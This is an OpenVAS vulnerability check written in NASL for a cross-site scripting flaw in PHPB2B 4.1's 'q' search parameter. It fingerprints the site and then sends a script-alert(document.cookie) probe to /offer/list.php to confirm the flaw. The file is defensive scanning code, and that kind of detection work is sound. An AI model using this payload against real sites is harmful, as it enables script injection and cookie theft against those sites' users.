###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpb2b_q_param_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PHPB2B 'q' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "PHPB2B version 4.1 and prior.";
tag_insight = "The flaw is due to improper validation of user-supplied input via
  the 'q' parameter to /offer/list.php, which allows attacker to execute
  arbitrary HTML and script code on the user's browser session in the security
  context of an affected site.";
tag_solution = "No solution or patch is available as of 04th January, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.phpb2b.com/";
tag_summary = "The host is running PHPB2B and is prone to cross site scripting
  vulnerability.";

if(description)
{
  script_id(802369);
  script_version("$Revision: 13 $");
  script_bugtraq_id(51221);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-05 15:17:25 +0530 (Mon, 05 Dec 2011)");
  script_name("PHPB2B 'q' Parameter Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108280/phpb2b-xss.txt");
  script_xref(name : "URL" , value : "http://vulnsecuritylist.com/vulnerability/phpb2b-cross-site-scripting/");

  script_description(desc);
  script_summary("Check if PHPB2B is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP port
phpb2bPort = get_http_port(default:80);
if(!phpb2bPort){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:phpb2bPort)) {
  exit(0);
}


foreach dir (make_list("/phpb2b", "/phpb2b/upload", cgi_dirs()))
{
  ## Send and Receive the response
  sndReq = http_get(item:string(dir, "/index.php"), port:phpb2bPort);
  rcvRes = http_send_recv(port:phpb2bPort, data:sndReq);

  ## Confirm application is Member Management System
  if("PHPB2B e-commerce Web Site Management System" >< rcvRes &&
     ">Powered by PHPB2B" >< rcvRes)
  {
    ## Path of Vulnerable Page
    url = dir + '/offer/list.php?do=search&q=<script>alert' +
          '(document.cookie)</script>';

    ## Send XSS attack and check the response to confirm vulnerability.
    if(http_vuln_check(port:phpb2bPort, url:url, pattern:"<script>alert\(document." +
                                               "cookie\)</script>"))
    {
       security_warning(phpb2bPort);
       exit(0);
    }
  }
}